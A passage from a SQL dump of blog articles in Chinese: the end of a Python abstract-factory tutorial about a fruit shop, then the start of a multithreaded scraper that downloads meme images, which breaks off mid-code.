<li><code>水果工厂主要针对消费者的不同“购买需求”将任务分派给子工厂进行执行；</code></li>\n  <li><code>品种工厂负责管理水果的种类，价格工厂负责管理水果的价格，称重工厂负责水果的称重，包装工厂负责水果的包装方式。</code></li>\n </ul> \n <p>项目的UML用例图如下：</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210614160125294.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FjY2VwdGVkZGF5,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <p><strong>实现的代码如下：</strong></p> \n <pre><code class=\"prism language-python\"><span class=\"token keyword\">class</span> <span class=\"token class-name\">FruitClass</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># 品种工厂</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">get_name</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name_index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> name_index <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n            name_object <span class=\"token operator\">=</span> OrangeClass<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">elif</span> name_index <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n            name_object <span class=\"token operator\">=</span> Hami_MelonClass<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">elif</span> name_index <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span>\n            name_object <span class=\"token operator\">=</span> GrapeClass<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            name_object <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\n\n        <span class=\"token keyword\">return</span> name_object\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">OrangeClass</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># 橘子类</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"橘子\"</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">print_name</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"您购买的水果为：%s\"</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Hami_MelonClass</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># 哈密瓜类</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"哈密瓜\"</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">print_name</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"您购买的水果为：%s\"</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">GrapeClass</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># 葡萄类</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> <span class=\"token string\">\"葡萄\"</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">print_name</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"您购买的水果为：%s\"</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">FruitWeight</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># 称重工厂</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> weight<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>weight <span class=\"token operator\">=</span> <span class=\"token builtin\">float</span><span class=\"token punctuation\">(</span>weight<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">print_weight</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"该水果的重量为：%.2f千克\"</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>weight<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">FruitPrice</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># 价格工厂</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">get_price</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name_index<span class=\"token punctuation\">,</span> variety<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> name_index <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span>\n            price_object <span class=\"token operator\">=</span> OrangePrice<span class=\"token punctuation\">(</span>variety<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">elif</span> name_index <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n            price_object <span class=\"token operator\">=</span> Hami_MelonPrice<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">elif</span> name_index <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span>\n            price_object <span class=\"token operator\">=</span> GrapePrice<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            price_object <span class=\"token operator\">=</span> <span class=\"token boolean\">None</span>\n\n        <span class=\"token keyword\">return</span> price_object\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">OrangePrice</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># 橘子价格类</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> variety<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>variety <span class=\"token operator\">=</span> variety\n        <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>variety <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n            self<span class=\"token punctuation\">.</span>price <span class=\"token operator\">=</span> <span class=\"token number\">8.5</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            self<span class=\"token punctuation\">.</span>price <span class=\"token operator\">=</span> <span class=\"token number\">11.0</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">print_price</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"该水果的单价为:%.2f元/千克\"</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>price<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Hami_MelonPrice</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># 哈密瓜价格类</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>price <span class=\"token operator\">=</span> <span class=\"token number\">24.3</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">print_price</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"该水果的价格为:%.2f元/千克\"</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>price<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">GrapePrice</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># 葡萄价格类</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        self<span class=\"token punctuation\">.</span>price <span class=\"token operator\">=</span> <span class=\"token number\">16.2</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">print_price</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"该水果的价格为:%.2f元/千克\"</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>price<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>price\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">FruitPack</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># 包装工厂</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> pack<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> pack <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\n            self<span class=\"token punctuation\">.</span>pack <span class=\"token operator\">=</span> <span class=\"token string\">\"散称\"</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n            self<span class=\"token punctuation\">.</span>pack <span class=\"token operator\">=</span> <span class=\"token string\">\"盒装\"</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">print_pack</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"该水果的打包方式为：%s\"</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">FruitFactory</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name_index<span class=\"token punctuation\">,</span> weight<span class=\"token punctuation\">,</span> variety<span class=\"token punctuation\">,</span> pack<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token comment\"># 任务的分配，品种、重量、价格、包装方式</span>\n        self<span class=\"token punctuation\">.</span>name_object <span class=\"token operator\">=</span> FruitClass<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>get_name<span class=\"token punctuation\">(</span>name_index<span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>weight_object <span class=\"token operator\">=</span> FruitWeight<span class=\"token punctuation\">(</span>weight<span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>price_object <span class=\"token operator\">=</span> FruitPrice<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>get_price<span class=\"token punctuation\">(</span>name_index<span class=\"token punctuation\">,</span> variety<span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>pack_object <span class=\"token operator\">=</span> FruitPack<span class=\"token punctuation\">(</span>pack<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">print_purchase</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token comment\"># 计算购买的金额</span>\n        money <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>price_object<span class=\"token punctuation\">.</span>price <span class=\"token operator\">*</span> self<span class=\"token punctuation\">.</span>weight_object<span class=\"token punctuation\">.</span>weight\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"需要支付的金额共计为：%.2f元\"</span> <span class=\"token operator\">%</span> money<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">show_info</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token comment\"># 展示最终的购买信息</span>\n        self<span class=\"token punctuation\">.</span>name_object<span class=\"token punctuation\">.</span>print_name<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>weight_object<span class=\"token punctuation\">.</span>print_weight<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>price_object<span class=\"token punctuation\">.</span>print_price<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>pack_object<span class=\"token punctuation\">.</span>print_pack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>print_purchase<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"-*-\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">20</span><span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Consumer</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># 消费者类</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"-*-\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">20</span><span class=\"token punctuation\">)</span>\n        <span class=\"token comment\"># 输入原始的“购买需求”信息</span>\n        self<span class=\"token punctuation\">.</span>name <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入你要购买的水果名称：0.橘子 1.哈密瓜 2.葡萄\\n\"</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>weight <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入你要购买水果的重量(kg)：\\n\"</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>variety <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"如果您购买橘子，我们有2种橘子：0.不买橘子 1.甘橘 2.砂糖橘\\n\"</span><span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>pack <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请您选择该水果的包装方式：1.散称 2.盒装\\n\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"-*-\"</span> <span class=\"token operator\">*</span> <span class=\"token number\">20</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">request</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token comment\"># 返回相关的购买信息</span>\n        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>weight<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>variety<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>pack\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\'__main__\'</span><span class=\"token punctuation\">:</span>\n    <span class=\"token comment\"># 创建顾客</span>\n    buyer <span class=\"token operator\">=</span> Consumer<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># 拿到顾客的购买信息</span>\n    buy_info <span class=\"token operator\">=</span> buyer<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># 使用水果工厂，传达指令至旗下的子工厂并执行购买操作</span>\n    buy_res <span class=\"token operator\">=</span> FruitFactory<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>buy_info<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>buy_info<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>buy_info<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>buy_info<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># 购买信息的展示</span>\n    buy_res<span class=\"token punctuation\">.</span>show_info<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre> \n <p><strong>相关的测试用例：</strong></p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210614160148498.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FjY2VwdGVkZGF5,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210614160156263.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FjY2VwdGVkZGF5,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210614160204155.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2FjY2VwdGVkZGF5,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p> \n <p><strong>本文关于设计模式的讲解思想，参考链接：<a href=\"https://www.runoob.com/design-pattern/abstract-factory-pattern.html\">抽象工厂模式</a></strong><br> <strong>如果有对python类的创建和继承等用法还不熟悉的小伙伴，请参考这篇博客：<a href=\"https://www.cnblogs.com/bigberg/p/7182741.html\"> python类的继承</a></strong></p> \n <blockquote> \n  <p><strong>往期推荐：</strong> <strong><a href=\"https://blog.csdn.net/acceptedday/article/details/117781683?spm=1001.2014.3001.5501\">点这里-&gt;Python：水果与设计模式-工厂模式</a></strong></p> \n </blockquote> \n</div>', '2021-07-03', NULL, '默认分类', '', 1, 0, NULL, NULL, 0);
INSERT INTO `t_article` VALUES (86, '聊天尬死名场面，你遇到过吗？教你一键获取斗图表情包，晋升聊天达人', '<div id=\"content_views\" class=\"markdown_views prism-atom-one-light\"> \n <svg xmlns=\"http://www.w3.org/2000/svg\" style=\"display: none;\"> \n  <path stroke-linecap=\"round\" d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path> \n </svg> \n <p>大家好呀，我是辣条。</p> \n <p>写这篇文章的灵感来源于之前和朋友的聊天，真的无力吐槽了，想发适合的表情包怼回去却发现收藏的表情包就那几个，就想着是不是可以爬取一些表情包，再也不用尬聊了。</p> \n <p>先给大家看看我遇到的聊天最尬的场面：</p> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615160048467.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FJMTk5NzAyMDU=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br> <img src=\"https://img-blog.csdnimg.cn/20210615160048317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FJMTk5NzAyMDU=,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <p></p> \n <div class=\"toc\"> \n  <h3>斗图吧图片采集</h3> \n  <ul>\n   <li>\n    <ul>\n     <li><a href=\"#_18\">抓取目标</a></li>\n     <li><a href=\"#_24\">工具使用</a></li>\n     <li><a href=\"#_30\">重点内容学习</a></li>\n     <li><a href=\"#_36\">项目思路分析</a></li>\n     <li><a href=\"#_79\">整理需求</a></li>\n     <li><a href=\"#_86\">简易源码分享</a></li>\n    </ul> </li>\n  </ul> \n </div> \n <p></p> \n <h2><a id=\"_18\"></a>抓取目标</h2> \n <p>网站：<a href=\"https://www.csdn.net/\">斗图吧</a><br> <img src=\"https://img-blog.csdnimg.cn/20210615134629146.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MDc1MTE4,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p> \n <h2><a id=\"_24\"></a>工具使用</h2> \n <p>开发环境：win10、python3.7<br> 开发工具：pycharm、Chrome<br> 工具包：requests、etree</p> \n <h2><a id=\"_30\"></a>重点内容学习</h2> \n <p>1.Q队列储存数据信息<br> 2.py多线程使用方法<br> 3.xpath语法学习</p> \n <h2><a id=\"_36\"></a>项目思路分析</h2> \n <p>根据你需要的关键字搜索对应的图片数据<br> 搜索的关键字和页数根据改变对应的url<br> https://www.doutula.com/search?type=photo&amp;more=1&amp;keyword={}&amp;page={}<br> 将对应的url地址保存在page队列里</p> \n <pre><code class=\"prism language-python\">    page_q <span class=\"token operator\">=</span> Queue<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    img_q <span class=\"token operator\">=</span> Queue<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        url <span class=\"token operator\">=</span> <span class=\"token string\">\'https://www.doutula.com/search?type=photo&amp;more=1&amp;keyword=%E7%A8%8B%E5%BA%8F%E5%91%98&amp;page={}\'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\n        page_q<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span>\n</code></pre> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615141047216.png#pic_center\" alt=\"在这里插入图片描述\"><br> 通过xpath方式提取当前页面的url地址以及图片的名字<br> 将提取到的图片和地址存储在img队列里</p> \n <pre><code class=\"prism language-python\">    <span class=\"token keyword\">def</span> <span class=\"token function\">parse_page</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>self<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>text\n        <span class=\"token comment\"># print(response)</span>\n        html <span class=\"token operator\">=</span> etree<span class=\"token punctuation\">.</span>HTML<span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">)</span>\n        images <span class=\"token operator\">=</span> html<span class=\"token punctuation\">.</span>xpath<span class=\"token punctuation\">(</span><span class=\"token string\">\'//div[@class=\"random_picture\"]\'</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">for</span> img <span class=\"token keyword\">in</span> images<span class=\"token punctuation\">:</span>\n            img_url <span class=\"token operator\">=</span> img<span class=\"token punctuation\">.</span>xpath<span class=\"token punctuation\">(</span><span class=\"token string\">\'.//img/@data-original\'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token comment\"># 获取图片名字</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>img_url<span class=\"token punctuation\">)</span>\n            alt <span class=\"token operator\">=</span> img<span class=\"token punctuation\">.</span>xpath<span class=\"token punctuation\">(</span><span class=\"token string\">\'.//p/text()\'</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">for</span> name<span class=\"token punctuation\">,</span> new_url <span class=\"token keyword\">in</span> <span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>alt<span class=\"token punctuation\">,</span> img_url<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                filename <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>sub<span class=\"token punctuation\">(</span><span class=\"token string\">r\'[?？.，。！!*\\\\/|]\'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\'\'</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\".jpg\"</span>\n                <span class=\"token comment\"># 获取图片的后缀名</span>\n                <span class=\"token comment\"># suffix = os.path.splitext(img_url)[1]</span>\n                <span class=\"token comment\"># print(alt)</span>\n                self<span class=\"token punctuation\">.</span>img_queue<span class=\"token punctuation\">.</span>put<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>new_url<span class=\"token punctuation\">,</span> filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n</code></pre> \n <p><img src=\"https://img-blog.csdnimg.cn/20210615142000513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1MDc1MTE4,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"><br> 根据图片地址下载保存图片<br> 保存图片是要根据图片url来判断保存的后缀（我统一保存的jpg，问就是因为懒癌晚期）</p> \n <h2><a id=\"_79\"></a>整理需求</h2> \n <ul>\n  <li>创建两个线程类，一个用来提取网页图片数据，一个保存图片数据</li>\n  <li>创建两个队列，一个保存page的url， 一个保存图片的url和名字</li>\n  <li>通过xpath的方法提取出网址的图片地址</li>\n </ul> \n <h2><a id=\"_86\"></a>简易源码分享</h2> \n <pre><code class=\"prism language-python\"><span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">from</span> lxml <span class=\"token keyword\">import</span> etree\n<span class=\"token keyword\">import</span> re\n<span class=\"token keyword\">from</span> queue <span class=\"token keyword\">import</span> Queue\n<span class=\"token keyword\">import</span> threading\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">ImageParse</span><span class=\"token punctuation\">(</span>threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> page_queue<span class=\"token punctuation\">,</span> img_queue<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token builtin\">super</span><span class=\"token punctuation\">(</span>ImageParse<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  \n        self<span class=\"token punctuation\">.</span>page_queue <span class=\"token operator\">=</span> page_queue\n        self<span class=\"token punctuation\">.</span>img_queue <span class=\"token operator\">=</span> img_queue\n        self<span class=\"token punctuation\">.</span>headers <span class=\"token operator\">=</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n        <span class=\"token string\">\'User-Agent\'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\'</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>page_queue<span class=\"token punctuation\">.</span>empty<span class=\"token 